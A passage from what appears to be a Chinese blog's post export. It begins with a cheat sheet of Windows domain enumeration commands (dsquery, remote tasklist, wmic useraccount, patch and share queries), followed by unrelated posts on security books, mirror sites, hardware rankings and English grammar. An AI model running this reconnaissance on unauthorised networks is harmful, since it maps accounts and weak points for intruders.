<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dsquery computer       ----- finds computers in the directory.</span><br><span class="line">dsquery contact           ----- finds contacts in thedirectory.</span><br><span class="line">dsquery subnet            ----- finds subnets in thedirectory.</span><br><span class="line">dsquery group             ----- finds groups in thedirectory.</span><br><span class="line">dsquery ou                   ----- finds organizationalunits in the directory.</span><br><span class="line">dsquery site                 ----- finds sites in thedirectory.</span><br><span class="line">dsquery server             ----- finds domain controllers inthe directory.</span><br><span class="line">dsquery user                ----- finds users in thedirectory.</span><br><span class="line">dsquery quota              ----- finds quota specificationsin the directory.</span><br><span class="line">dsquery partition         ----- finds partitions in thedirectory.</span><br><span class="line">dsquery *                     ----- finds any object inthe directory by using a generic LDAP query.</span><br><span class="line">dsquery server –domain Yahoo.com | dsget server–dnsname –site ---搜索域内域控制器的DNS主机名和站点名</span><br><span class="line">dsquery computer domainroot –name *-xp –limit 10----- 搜索域内以-xp结尾的机器10台</span><br><span class="line">dsquery user domainroot –name admin* -limit ---- 搜索域内以admin开头的用户10个</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#注:dsquery来源于Windows Server 2003 Administration Tools Pack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasklist &#x2F;V                                                      ----- 查看进程[显示对应用户]</span><br><span class="line">tasklist &#x2F;S ip &#x2F;U domain\username &#x2F;P &#x2F;V             ----- 查看远程计算机进程列表</span><br><span class="line">qprocess *                                                    ----- 类似tasklist</span><br><span class="line">qprocess &#x2F;SERVER:IP                                      ----- 远程查看计算机进程列表</span><br><span class="line">nslookup –qt-MX Yahoo.com                           ----- 查看邮件服务器</span><br><span class="line">whoami &#x2F;all                                                   ----- 查询当前用户权限等</span><br><span class="line">set                                                              ----- 查看系统环境变量</span><br><span class="line">systeminfo                                                    ----- 查看系统信息</span><br><span class="line">qwinsta                                                        ----- 查看登录情况</span><br><span class="line">qwinsta &#x2F;SERVER:IP                                       ----- 查看远程登录情况</span><br><span class="line">fsutil fsinfo drives                                           ----- 查看所有盘符</span><br><span class="line">gpupdate &#x2F;force                                            ----- 更新</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 域策略</span><br><span class="line"></span><br><span class="line">wmic bios                                      -----看bios信息</span><br><span class="line">wmic qfe                                           ----- 查看补丁信息</span><br><span class="line">wmic qfe get hotfixid                                     ----- 查看补丁-Patch号</span><br><span class="line">wmic startup                                                 ----- 查看启动项</span><br><span class="line">wmic service                                                 ----- 查看服务</span><br><span class="line">wmic os                                                       ----- 查看OS信息</span><br><span class="line">wmic process get caption,executablepath,commandline</span><br><span class="line">wmic process call create “process_name” (executes a program)</span><br><span class="line">wmic process where name&#x3D;”process_name” call terminate (terminates program)</span><br><span class="line">wmic logicaldisk where drivetype&#x3D;3 get name, freespace, systemname, filesystem, size,</span><br><span class="line">volumeserialnumber (hard drive information)</span><br><span class="line">wmic useraccount (usernames, sid, and various security related goodies)</span><br><span class="line">wmic useraccount get &#x2F;ALL</span><br><span class="line">wmic share get &#x2F;ALL (you can use ? for gets help ! )</span><br><span class="line">wmic startup list full (this can be a huge list!!!)</span><br><span class="line">wmic &#x2F;node:&quot;hostname&quot; bios get serialnumber (this can be great for finding warranty info about target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>命令</tag>
      </tags>
  </entry>
  <entry>
    <title>安全书籍</title>
    <url>/2019/10/01/%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/</url>
    <content><![CDATA[<h1 id="在线安全书籍"><a href="#在线安全书籍" class="headerlink" title="在线安全书籍"></a>在线安全书籍</h1><h2 id="Web安全书籍"><a href="#Web安全书籍" class="headerlink" title="Web安全书籍"></a>Web安全书籍</h2><p><a href="https://wizardforcel.gitbooks.io/web-hacking-101/">Web Hacking 101 中文版</a><br><a href="https://wizardforcel.gitbooks.io/kali-linux-web-pentest-cookbook/">Kali Linux Web渗透测试秘籍 中文版</a><br><a href="https://t0data.gitbooks.io/burpsuite/">Kali Linux burpsuite实战指南</a><br><a href="https://github.com/qazbnm456/awesome-web-security/">Web安全资料和资源列表</a></p>
<h2 id="WiFi安全书籍"><a href="#WiFi安全书籍" class="headerlink" title="WiFi安全书籍"></a>WiFi安全书籍</h2><p><a href="https://wizardforcel.gitbooks.io/kali-linux-wireless-pentest/">Kali Linux 无线渗透测试入门指南 中文版</a></p>
<h2 id="PoC编写安全书籍"><a href="#PoC编写安全书籍" class="headerlink" title="PoC编写安全书籍"></a>PoC编写安全书籍</h2><p><a href="https://poc.evalbug.com/">PoC(概念验证)编写指南</a></p>
<a id="more"></a>
<h2 id="PHP代码审计安全书籍"><a href="#PHP代码审计安全书籍" class="headerlink" title="PHP代码审计安全书籍"></a>PHP代码审计安全书籍</h2><p><a href="https://phpaudit.books.virzz.com/">PHP代码审计</a><br><a href="https://wizardforcel.gitbooks.io/php-common-vulnerability/">论PHP常见的漏洞</a></p>
<h2 id="Android安全书籍"><a href="#Android安全书籍" class="headerlink" title="Android安全书籍"></a>Android安全书籍</h2><p><a href="https://wizardforcel.gitbooks.io/lpad/">Android 渗透测试学习手册 中文版</a></p>
<h2 id="Python编程书籍"><a href="#Python编程书籍" class="headerlink" title="Python编程书籍"></a>Python编程书籍</h2><p><a href="https://piaosanlang.gitbooks.io/spiders/">Python爬虫</a><br><a href="https://aceld.gitbooks.io/python/">Python高级与网络编程</a></p>
<h2 id="渗透测试书籍"><a href="#渗透测试书籍" class="headerlink" title="渗透测试书籍"></a>渗透测试书籍</h2><p><a href="https://wizardforcel.gitbooks.io/kali-linux-cookbook/">Kali Linux 秘籍 中文版</a><br><a href="https://wizardforcel.gitbooks.io/kali-linux-doc/">Kali Linux 中文文档</a><br><a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/">大学霸 Kali Linux 安全渗透教程</a><br><a href="https://wizardforcel.gitbooks.io/metasploit-manual/">Metasploit v4 POC 上手指南</a><br><a href="https://wizardforcel.gitbooks.io/nmap-man-page/">Nmap 参考指南</a><br><a href="https://wizardforcel.gitbooks.io/wireshark-manual/">Wireshark 用户手册</a></p>
]]></content>
      <categories>
        <category>安全</category>
        <category>书籍</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Hacker</tag>
        <tag>书籍</tag>
      </tags>
  </entry>
  <entry>
    <title>思维导图使用</title>
    <url>/2019/09/23/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="软件版"><a href="#软件版" class="headerlink" title="软件版"></a>软件版</h2><h3 id="全平台"><a href="#全平台" class="headerlink" title="全平台"></a>全平台</h3><ul>
<li>XMind</li>
<li>MindMaster</li>
</ul>
<h2 id="网页版"><a href="#网页版" class="headerlink" title="网页版"></a>网页版</h2><ul>
<li><a href="https://coggle.it/">coggle</a>（美观,推荐使用）</li>
<li><a href="https://naotu.baidu.com/">百度脑图</a></li>
<li><a href="https://app.gitmind.cn/">GitMind</a></li>
<li><a href="https://mm.edrawsoft.cn/">MindMaster</a>（云端存储初始为10MB，每天签到才送1MB）</li>
</ul>
<a id="more"></a>
<h2 id="Markdown中使用思维导图"><a href="#Markdown中使用思维导图" class="headerlink" title="Markdown中使用思维导图"></a>Markdown中使用思维导图</h2><p>Markdown文档支持html标签，在网页版的思维导图中将图表分享出来，得到分享链接，然后将链接添加到html标签中，即可在Markdown文档中使用网页版的思维导图（需联网才能使用）</p>
<h4 id="coggle"><a href="#coggle" class="headerlink" title="coggle"></a>coggle</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">&#x27;853&#x27;</span> <span class="attr">height</span>=<span class="string">&#x27;880&#x27;</span> <span class="attr">src</span>=<span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span> <span class="attr">frameborder</span>=<span class="string">&#x27;0&#x27;</span> <span class="attr">allowfullscreen</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe width="853" height="880" src="https://embed.coggle.it/diagram/XYdixxcw7gwyODa2/e5e0a11b673127a3a9e1bdba75bbe4073015b8cd15f3b3fa3827d22389bf188d" frameborder="0" allowfullscreen></iframe>


<h4 id="百度脑图（网页上可能会出现不显示的情况）"><a href="#百度脑图（网页上可能会出现不显示的情况）" class="headerlink" title="百度脑图（网页上可能会出现不显示的情况）"></a>百度脑图（网页上可能会出现不显示的情况）</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;iframe width=<span class="string">&#x27;800&#x27;</span> height=<span class="string">&#x27;800&#x27;</span> src=<span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span> frameborder=<span class="string">&#x27;0&#x27;</span> allowfullscreen&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe width="800" height="800" src="http://naotu.baidu.com/file/da4849720c959c83587bf3bc59bcf29e?token=b18fec1ac5870f57" frameborder="0" allowfullscreen></iframe>

<h4 id="GitMind"><a href="#GitMind" class="headerlink" title="GitMind"></a>GitMind</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;iframe width=<span class="string">&#x27;800&#x27;</span> height=<span class="string">&#x27;800&#x27;</span> src=<span class="string">&#x27;xxxxxxxxxxxxxxx&#x27;</span> frameborder=<span class="string">&#x27;0&#x27;</span> allowfullscreen&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe width="800" height="800" src="https://app.gitmind.cn/doc/86a11950" frameborder="0" allowfullscreen></iframe>

<h4 id="MindMaster"><a href="#MindMaster" class="headerlink" title="MindMaster"></a>MindMaster</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder=<span class="string">&quot;no&quot;</span> border=<span class="string">&quot;0&quot;</span> marginwidth=<span class="string">&quot;0&quot;</span> marginheight=<span class="string">&quot;0&quot;</span> width=800 height=800 src=<span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
<p><strong>例</strong>：</p>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="800" height="800" src="https://edrawcloudpubliccn.oss-cn-shenzhen.aliyuncs.com/viewer/self/1198898/share/2019-9-23/1569199487/main.svg"></iframe>


]]></content>
      <tags>
        <tag>思维导图</tag>
      </tags>
  </entry>
  <entry>
    <title>有用的镜像站</title>
    <url>/2020/02/27/%E6%9C%89%E7%94%A8%E7%9A%84%E9%95%9C%E5%83%8F%E7%AB%99/</url>
    <content><![CDATA[<p>国内访问一些网站是被屏蔽的或是访问慢，一些镜像站就能满足这些需求</p>
<h1 id="谷歌-amp-谷歌学术"><a href="#谷歌-amp-谷歌学术" class="headerlink" title="谷歌 &amp; 谷歌学术"></a>谷歌 &amp; 谷歌学术</h1><ul>
<li><p><a href="https://ac.scmor.com/"><code>https://ac.scmor.com/</code></a></p>
</li>
<li><p><a href="http://scholar.hedasudi.com/"><code>http://scholar.hedasudi.com/</code></a></p>
</li>
<li><p><a href="http://tool.yovisun.com/gs/"><code>http://tool.yovisun.com/gs/</code></a></p>
</li>
</ul>
<a id="more"></a>
<h1 id="谷歌学术"><a href="#谷歌学术" class="headerlink" title="谷歌学术"></a><a href="https://scholar.google.com.hk/">谷歌学术</a></h1><ul>
<li><p><a href="https://gfsoso.99lb.net/"><code>https://gfsoso.99lb.net/</code></a></p>
</li>
<li><p><a href="https://cc.gufenxueshu.com/scholar/"><code>https://cc.gufenxueshu.com/scholar/</code></a></p>
</li>
<li><p><a href="https://www.gycc.com/"><code>https://www.gycc.com/</code></a></p>
</li>
</ul>
<h1 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h1><ul>
<li><p><a href="https://www.wanweibaike.com/"><code>https://www.wanweibaike.com/</code></a></p>
</li>
<li><p><a href="https://zh.wikipedia-mirror.org/"><code>https://zh.wikipedia-mirror.org/</code></a></p>
</li>
<li><p><a href="https://dumps.wikimedia.org/zhwiki/latest/">数据下载<code>https://dumps.wikimedia.org/zhwiki/latest/</code></a></p>
</li>
</ul>
<h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><ul>
<li><a href="https://github.com.cnpmjs.org/"><code>https://github.com.cnpmjs.org/</code></a></li>
</ul>
<h1 id="谷歌商店"><a href="#谷歌商店" class="headerlink" title="谷歌商店"></a>谷歌商店</h1><ul>
<li><p><a href="https://www.gugeapps.net/"><code>https://www.gugeapps.net/</code></a></p>
</li>
<li><p><a href="http://www.cnplugins.com/"><code>http://www.cnplugins.com/</code></a></p>
</li>
<li><p><a href="https://www.crx4chrome.com/"><code>https://www.crx4chrome.com/</code></a></p>
</li>
<li><p><a href="https://www.chromefor.com/"><code>https://www.chromefor.com/</code></a></p>
</li>
</ul>
<h1 id="油管"><a href="#油管" class="headerlink" title="油管"></a>油管</h1><ul>
<li><a href="https://www.biantube.com/"><code>https://www.biantube.com/</code></a></li>
</ul>
<h1 id="SCI-Hub"><a href="#SCI-Hub" class="headerlink" title="SCI-Hub"></a>SCI-Hub</h1><ul>
<li><a href="http://tool.yovisun.com/scihub/"><code>http://tool.yovisun.com/scihub/</code></a></li>
</ul>
<h1 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h1><ul>
<li><a href="https://npm.taobao.org/"><code>https://npm.taobao.org/</code></a></li>
</ul>
<h1 id="golang"><a href="#golang" class="headerlink" title="golang"></a>golang</h1><ul>
<li><p><a href="https://golang.google.cn/dl/"><code>https://golang.google.cn/dl/</code></a></p>
</li>
<li><p><a href="https://gomirrors.org/"><code>https://gomirrors.org/</code></a></p>
</li>
<li><p><a href="https://goproxy.cn"><code>https://goproxy.cn</code></a></p>
</li>
</ul>
<h1 id="composer-php"><a href="#composer-php" class="headerlink" title="composer(php)"></a>composer(php)</h1><ul>
<li><p><a href="http://php.p2hp.com/"><code>http://php.p2hp.com/</code></a></p>
</li>
<li><p><a href="https://developer.aliyun.com/composer"><code>https://developer.aliyun.com/composer</code></a></p>
</li>
</ul>
<p>参考：<a href="https://sushengbuhuo.github.io/2019/12/19/%E9%82%A3%E4%BA%9B%E4%BD%A0%E7%94%A8%E5%BE%97%E4%B8%8A%E7%9A%84%E9%95%9C%E5%83%8F%E7%BD%91%E7%AB%99/">那些你用得上的镜像网站</a></p>
]]></content>
      <tags>
        <tag>镜像站</tag>
      </tags>
  </entry>
  <entry>
    <title>电脑配件排行榜</title>
    <url>/2020/03/01/%E7%94%B5%E8%84%91%E9%85%8D%E4%BB%B6%E6%8E%92%E8%A1%8C%E6%A6%9C/</url>
    <content><![CDATA[<p><a href="https://www.passmark.com/">passmark主站</a></p>
<p><a href="http://diy.zol.com.cn/">中关村DIY</a></p>
<p><a href="https://diy.pconline.com.cn/">太平洋DIY</a></p>
<p><a href="http://tieba.baidu.com/p/6420786616?see_lz=1">贴吧<code>花飞青天揽明月</code>的处理器及显卡天梯图</a>（<strong>包含桌面和笔记本,推荐</strong>）</p>
<a id="more"></a>
<h1 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h1><ul>
<li><p><a href="https://www.cpubenchmark.net/">CPU passmark主站</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/high_end_cpus.html">高端CPU</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/mid_range_cpus.html">中高端CPU</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/midlow_range_cpus.html">中低端CPU</a></p>
</li>
<li><p><a href="https://www.cpubenchmark.net/low_end_cpus.html">低端CPU</a></p>
</li>
<li><p><a href="http://cdn.malu.me/cpu/">CPU性能天梯表</a></p>
</li>
<li><p><a href="https://www.mydrivers.com/zhuanti/tianti/cpu/index.html">桌面处理器天梯图</a></p>
</li>
<li><p><a href="https://diy.pconline.com.cn/tiantitu/cpu/">太平洋电脑桌面处理器天梯图</a></p>
</li>
<li><p><a href="https://topic.expreview.com/CPU/">超能网处理器天梯图</a></p>
</li>
<li><p><a href="https://cpu.zol.com.cn/soc/">中关村处理器天梯图</a></p>
</li>
<li><p><a href="http://www.mydrivers.com/zhuanti/tianti/01/index.html">手机处理器天梯图</a></p>
</li>
<li><p>贴吧<code>花飞青天揽明月</code>更新「CPU天梯图v2.0.3 20200221中国加油」<br><a href="https://imgchr.com/i/32sPEV"><img src="https://s2.ax1x.com/2020/03/01/32sPEV.png" alt="32sPEV.png"></a></p>
</li>
</ul>
<h1 id="GPU"><a href="#GPU" class="headerlink" title="GPU"></a>GPU</h1><ul>
<li><p><a href="https://www.videocardbenchmark.net/">GPU passmark主站</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/high_end_gpus.html">高端GPU</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/mid_range_gpus.html">中高端GPU</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/midlow_range_gpus.html">中低端GPU</a></p>
</li>
<li><p><a href="https://www.videocardbenchmark.net/low_end_gpus.html">低端GPU</a></p>
</li>
<li><p><a href="http://cdn.malu.me/gpu/">GPU性能天梯表</a></p>
</li>
<li><p><a href="https://www.mydrivers.com/zhuanti/tianti/gpu/index.html">桌面显卡天梯图</a></p>
</li>
<li><p><a href="https://topic.expreview.com/GPU/">超能网显卡天梯图</a></p>
</li>
<li><p><a href="http://vga.zol.com.cn/soc/">中关村显卡天梯图</a></p>
</li>
<li><p>贴吧<code>花飞青天揽明月</code>更新「显卡天梯图v5.3.5 20200221中国加油」<br><a href="https://imgchr.com/i/32siNT"><img src="https://s2.ax1x.com/2020/03/01/32siNT.png" alt="32siNT.png"></a></p>
</li>
</ul>
<h1 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h1><ul>
<li><p><a href="https://www.harddrivebenchmark.net/">硬盘passmark主站</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/high_end_drives.html">高端硬盘</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/mid_range_drives.html">中高端硬盘</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/low_mid_range_drives.html">中低端硬盘</a></p>
</li>
<li><p><a href="https://www.harddrivebenchmark.net/low_end_drives.html">低端硬盘</a></p>
</li>
<li><p><a href="http://cdn.malu.me/hard/">硬盘性能天梯表</a></p>
</li>
<li><p><a href="https://m.zol.com.cn/ssd/soc.html">中关村硬盘天梯图</a></p>
</li>
</ul>
<h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><ul>
<li><a href="https://www.memorybenchmark.net/">内存passmark主站</a></li>
</ul>
<h1 id="电源"><a href="#电源" class="headerlink" title="电源"></a>电源</h1><ul>
<li><a href="http://power.zol.com.cn/soc/">中关村电源天梯图</a></li>
</ul>
]]></content>
      <tags>
        <tag>排行榜</tag>
      </tags>
  </entry>
  <entry>
    <title>自动挂载U盘等外部存储</title>
    <url>/2019/10/04/%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BDU%E7%9B%98%E7%AD%89%E5%A4%96%E9%83%A8%E5%AD%98%E5%82%A8/</url>
    <content><![CDATA[<p>自动挂载U盘等外部存储位置,需要安装<code>usbmount</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S usbmount</span><br></pre></td></tr></table></figure>
<p>配置<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/usbmount/usbmount.conf</span><br><span class="line"><span class="comment"># 在MOUNTOPTIONS那行添加user即可使普通用户也对挂载的U盘拥有写权限, 如下: MOUNTOPTIOS=&quot;rw,user,noatime,nodiratime&quot;</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>自动</tag>
      </tags>
  </entry>
  <entry>
    <title>英语语法冲入门掉入坑day01</title>
    <url>/2019/10/04/%E8%8B%B1%E8%AF%AD%E8%AF%AD%E6%B3%95%E5%86%B2%E5%85%A5%E9%97%A8%E6%8E%89%E5%85%A5%E5%9D%91day01/</url>
    <content><![CDATA[<h1 id="10种词性"><a href="#10种词性" class="headerlink" title="10种词性"></a>10种词性</h1><p><strong>很多单词有多个词性，不同情况下使用不同词性</strong></p>
<ul>
<li>noun (名词)</li>
<li>pronoun (代词)</li>
<li>numeral (数词)</li>
<li>article (冠词)</li>
<li>varb (动词)</li>
<li>adverb (副词)</li>
<li>adjective (形容词)</li>
<li>preposition (介词)</li>
<li>conjunction (连词)</li>
<li>interjection (感叹词)</li>
</ul>
<a id="more"></a>
<h2 id="noun-名词-n"><a href="#noun-名词-n" class="headerlink" title="noun (名词) n."></a>noun (名词) <code>n.</code></h2><p><strong>东西叫什么就是名词</strong></p>
<p>例：apple、cat、China</p>
<h2 id="pronoun-代词-pron"><a href="#pronoun-代词-pron" class="headerlink" title="pronoun (代词) pron."></a>pronoun (代词) <code>pron.</code></h2><p><strong>可以代替名词、名词性短语的一种词</strong></p>
<p>例：we、that、all、who</p>
<h2 id="numeral-数词-num"><a href="#numeral-数词-num" class="headerlink" title="numeral (数词) num."></a>numeral (数词) <code>num.</code></h2><p><strong>数词就是数字</strong></p>
<p>列：one、疼、fifty、hundred</p>
<h2 id="article-冠词-art"><a href="#article-冠词-art" class="headerlink" title="article (冠词) art."></a>article (冠词) <code>art.</code></h2><p><strong>加在名词/名词词组前后的词，冠词只有以下几个</strong></p>
<p>不定冠词：<code>a</code>、<code>an</code><br>定冠词：<code>the</code><br>表量冠词：<code>some</code></p>
<h2 id="verb-动词-v"><a href="#verb-动词-v" class="headerlink" title="verb (动词) v."></a>verb (动词) <code>v.</code></h2><p><strong>表示动作的词</strong></p>
<p>例：get、do、play</p>
<h2 id="adverb-副词-adv"><a href="#adverb-副词-adv" class="headerlink" title="adverb (副词) adv."></a>adverb (副词) <code>adv.</code></h2><p><strong>副词是用于修饰动词或加强描绘 词组/整个句子 的词</strong></p>
<p>修饰动词用于给<strong>动作增加别的属性</strong></p>
<p>例：next、much、back</p>
<h2 id="adjective-形容词-adj"><a href="#adjective-形容词-adj" class="headerlink" title="adjective (形容词) adj."></a>adjective (形容词) <code>adj.</code></h2><p><strong>修饰名词的词</strong></p>
<p>例：good、fast、hot</p>
<h2 id="preposition-介词-prep"><a href="#preposition-介词-prep" class="headerlink" title="preposition (介词) prep."></a>preposition (介词) <code>prep.</code></h2><p><strong>介于名词代词等词之间的词叫介词，用来关联词与词之间的文法关系，没有实际意义</strong></p>
<p>介词前是与介词搭配的词，可能是动词、名词或形容词介词，宾语一般放在后面。宾语的形式主要是名词，还有相当于名词的代词、数词、动名词及名词性从句等</p>
<p>例：at、in、on</p>
<h2 id="conjunction-连词-conj"><a href="#conjunction-连词-conj" class="headerlink" title="conjunction (连词) conj."></a>conjunction (连词) <code>conj.</code></h2><p><strong>用来连接词语、短语、句子、段落等的词，形成逻辑关系、语法结构等关系</strong></p>
<p>例：and、also、but、</p>
<h2 id="interjection-感叹词-int"><a href="#interjection-感叹词-int" class="headerlink" title="interjection (感叹词) int."></a>interjection (感叹词) <code>int.</code></h2><p><strong>用于表达各种感情的词，一般与句子本身没有实际联系</strong></p>
<p>例：what、yum、blah</p>
<h1 id="9种成分"><a href="#9种成分" class="headerlink" title="9种成分"></a>9种成分</h1><ul>
<li>subject (主)</li>
<li>predicate (谓)</li>
<li>object (宾)</li>
<li>attribute (定语)</li>
<li>adverbial (状语)</li>
<li>object complement (宾补)</li>
<li>subject complement (表语)</li>
<li>double object (双宾)</li>
<li>apposition (同位)</li>
</ul>
<h1 id="8种句型"><a href="#8种句型" class="headerlink" title="8种句型"></a>8种句型</h1><h2 id="简单句"><a href="#简单句" class="headerlink" title="简单句"></a>简单句</h2><ul>
<li>主 <code>+</code> 谓</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾</li>
<li>主 <code>+</code> 系 <code>+</code> 表</li>
<li>主 <code>+</code> 谓 <code>+</code> 双宾</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾 <code>+</code> 宾补</li>
</ul>
<h2 id="复合句-从句"><a href="#复合句-从句" class="headerlink" title="复合句(从句)"></a>复合句(从句)</h2><ul>
<li>名词性从句</li>
<li>定语从句</li>
<li>状语从句</li>
</ul>
<h1 id="简单句-1"><a href="#简单句-1" class="headerlink" title="简单句"></a>简单句</h1><ul>
<li>陈述句</li>
<li>疑问句</li>
<li>感叹句</li>
<li>祈使句</li>
</ul>
<h2 id="陈述句"><a href="#陈述句" class="headerlink" title="陈述句"></a>陈述句</h2><p><strong>描述一个东西、事实，把一个东西给陈述出来</strong></p>
<p>陈述句分两种：</p>
<ul>
<li>肯定式</li>
<li>否定式</li>
</ul>
<p><strong>肯定变否定：助动词(<code>do</code>)后加否定词(<code>not</code>)</strong></p>
<p>例：<br>肯：<code>I have money</code><br>否：<code>I don&#39;t(do not) have money</code></p>
<h3 id="陈述句5种句型"><a href="#陈述句5种句型" class="headerlink" title="陈述句5种句型"></a>陈述句5种句型</h3><ul>
<li>主 <code>+</code> 谓</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾</li>
<li>主 <code>+</code> 系 <code>+</code> 表</li>
<li>主 <code>+</code> 谓 <code>+</code> 双宾</li>
<li>主 <code>+</code> 谓 <code>+</code> 宾补</li>
</ul>
<h3 id="主-谓"><a href="#主-谓" class="headerlink" title="主 + 谓"></a>主 <code>+</code> 谓</h3><p><strong>不及物动词才能玩主谓结构</strong></p>
<p><code>I run</code> (我 跑)</p>
<p><strong>谓语用于描述主语的状态和动作</strong></p>
<h3 id="主-谓-宾"><a href="#主-谓-宾" class="headerlink" title="主 + 谓 + 宾"></a>主 <code>+</code> 谓 <code>+</code> 宾</h3><p><strong>宾语就是动作的接受者</strong></p>
<p><code>I love you</code> (我 爱 你)</p>
<h3 id="主-系-表"><a href="#主-系-表" class="headerlink" title="主 + 系 + 表"></a>主 <code>+</code> 系 <code>+</code> 表</h3><p>系动词 <code>=</code> be动词 <code>+</code> 感官动词</p>
<ul>
<li>be动词：一堆各种各样的是 <code>am</code>、<code>is</code>、<code>are</code>等等</li>
<li>感官动词：看、听、闻、尝、感觉、变得、似乎、保持、证明</li>
</ul>
<p>句子中间的谓语动词，如果是系动词后面的就是表</p>
<p><code>I am Iron Man</code> (我 是 钢铁侠)</p>
<h3 id="主-谓-双宾-直接宾语-间接宾语"><a href="#主-谓-双宾-直接宾语-间接宾语" class="headerlink" title="主 + 谓 + 双宾(直接宾语+间接宾语)"></a>主 <code>+</code> 谓 <code>+</code> 双宾(直接宾语<code>+</code>间接宾语)</h3><p><code>I give you money</code> (我 给 你 钱)<br>双宾表示谓语后加的两个东西，都是动作的对象<br><code>我 给 (你+钱)</code></p>
<p><strong>判断技巧：谓语后的两个东西，都能做被动语态主语的就是双宾，否则就是宾补</strong></p>
<p><code>我给(你+钱) = (你)被我给了(钱) = (钱)被我给了(你)</code></p>
<h3 id="主-谓-宾-宾补"><a href="#主-谓-宾-宾补" class="headerlink" title="主 + 谓 + 宾 + 宾补"></a>主 <code>+</code> 谓 <code>+</code> 宾 <code>+</code> 宾补</h3><p>和宾补一样都是谓语后有两个东西，但两个中只有一个能做被动语态主语</p>
<p><code>Thery ordered hamburger theit lunch</code> (他们 点了 汉堡 他们的午餐)<br>他们的午餐他们点了汉堡</p>
<p><strong>判断技巧：谓语后的两个东西，都能做被动语态主语的就是双宾，否则就是宾补</strong></p>
<p>他们 点了 (汉堡+他们的午餐)</p>
<p>(汉堡)被他们点了(他们的午餐) 说不通，被人点菜给汉堡吃？<br>(他们的午餐) 被他们点了(汉堡) 说的痛</p>
<h2 id="疑问句"><a href="#疑问句" class="headerlink" title="疑问句"></a>疑问句</h2><ul>
<li>一般疑问句</li>
<li>特殊疑问句</li>
<li>选择疑问句</li>
<li>反义疑问句</li>
</ul>
<h3 id="一般疑问句"><a href="#一般疑问句" class="headerlink" title="一般疑问句"></a>一般疑问句</h3><p><strong>可用<code>yes</code>，<code>no</code>回答的</strong></p>
<p><strong>陈述句变一般疑问句</strong>三种方式：</p>
<ul>
<li><p><strong>提前系动词</strong> (be动词、感官动词)</p>
<p>  主+系+表 <code>变</code> 系+主+表</p>
<p>  陈述句：<code>You (are) an idiot.</code> (你是个笨蛋)<br>  一般疑问句：<code>(Are) you an idiot?</code> (你是不是笨蛋)<br>  回答：<code>Yes,I am/No,I&#39;m not.</code></p>
</li>
<li><p><strong>提前助动词</strong> (do、have、shall等)</p>
<p>  主+谓+ (宾) <code>变</code> 助动词+主+动词原型+其他</p>
<p>  陈述句：You (have) got light bulbs. (你有灯泡)<br>  一般疑问句：(Have) you got light bulbs? (你有灯泡吗？)<br>  回答：Yes,I have/No,I haven’t</p>
</li>
<li><p><strong>提前情态动词</strong> (can、may、will等)</p>
<p>  主+情态动词+动词原型+其他 <code>变</code> 情态动词+主+动词原型+其他</p>
<p>  陈述句：You (can) play football. (你会踢足球)<br>  一般疑问句：(Can) you play footall? (你会踢足球吗？)<br>  回答：Yes,I can/No,I can’t</p>
</li>
</ul>
<h3 id="特殊疑问句"><a href="#特殊疑问句" class="headerlink" title="特殊疑问句"></a>特殊疑问句</h3><p><strong>不能用<code>yes</code>,<code>no</code>回答；对句子中的某个成分提问，用特殊疑问词开头</strong></p>
<h4 id="特殊疑问句的疑问词："><a href="#特殊疑问句的疑问词：" class="headerlink" title="特殊疑问句的疑问词："></a>特殊疑问句的疑问词：</h4><ul>
<li><code>Who</code>     提问人：Who’s next? (谁下一个？)</li>
<li><code>Whose</code>     提问所属：Whose car is this? (这是谁的车？)</li>
